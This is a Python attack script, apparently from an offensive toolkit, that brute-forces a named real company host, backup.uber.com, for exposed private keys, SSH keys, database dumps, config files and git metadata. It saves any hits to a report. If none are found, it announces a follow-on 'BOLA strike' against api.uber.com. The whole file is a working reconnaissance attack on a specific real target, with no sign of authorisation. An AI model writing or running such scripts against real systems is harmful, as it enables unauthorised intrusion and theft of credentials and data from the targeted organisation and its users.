import asyncio
import json
from aura.core.async_requester import AsyncRequester
from aura.ui.formatter import ZenithFormatter

async def backup_extraction():
    formatter = ZenithFormatter()
    formatter.banner("Uber Backup Node Brute-Force")
    
    target = "backup.uber.com"
    
    # Specialized wordlist for backup nodes
    wordlist = [
        "backup.zip", "backup.tar.gz", "bak.sql", "db.sql", "dump.sql",
        "private.key", "id_rsa", "config.php", "config.json", "env.php",
        "web.config", ".htaccess", ".git/index", "src.zip", "staging.zip",
        "v1.zip", "v2.zip", "test.zip", "old.zip", "api.zip"
    ]
    
    async with AsyncRequester(concurrency_limit=20, timeout=10) as requester:
        formatter.phase_banner("Backup Brute-Force", f"Testing {len(wordlist)} sensitive files on {target}...")
        
        requests = []
        for w in wordlist:
            requests.append({"method": "GET", "url": f"https://{target}/{w}"})
        
        results = await requester.fetch_all(requests)
        
        findings = []
        for req, resp in zip(requests, results):
            if resp and resp.status_code == 200:
                print(f"  [bold red][🚀] SENSITIVE FILE FOUND: {req['url']} (Size: {len(resp.text)})[/bold red]")
                findings.append({
                    "url": req["url"],
                    "status": resp.status_code,
                    "length": len(resp.text)
                })
            elif resp and resp.status_code in [403, 401]:
                print(f"  [yellow][{resp.status_code}] Denied: {req['url']}[/yellow]")

    if findings:
        with open("reports/backup_brute_findings.json", "w") as f:
            json.dump(findings, f, indent=4)
        print(f"\n[✓] Backup brute-force complete. CHECK FINDINGS IMMEDIATELY.")
    else:
        print("\n[!] No backups identified on common wordlist. Moving to BOLA strike on `api.uber.com`.")

if __name__ == "__main__":
    asyncio.run(backup_extraction())
